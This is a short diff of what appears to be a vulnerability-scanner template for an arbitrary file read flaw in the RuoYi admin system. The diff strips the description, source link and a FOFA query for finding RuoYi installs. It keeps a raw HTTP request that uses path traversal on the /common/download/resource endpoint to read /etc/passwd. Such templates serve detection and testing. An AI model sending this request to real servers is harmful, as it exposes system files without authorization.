@@ -3,12 +3,8 @@ info:
   name: 若依RuoYi系统 任意文件读取
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tfw4unwn7rx5w2d5'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tfw4unwn7rx5w2d5
-    fofa: app.name="RuoYi 若依"
 http:
 - raw:
   - 'GET /common/download/resource?resource=/profile/../../../../../../../etc/passwd  HTTP/1.1
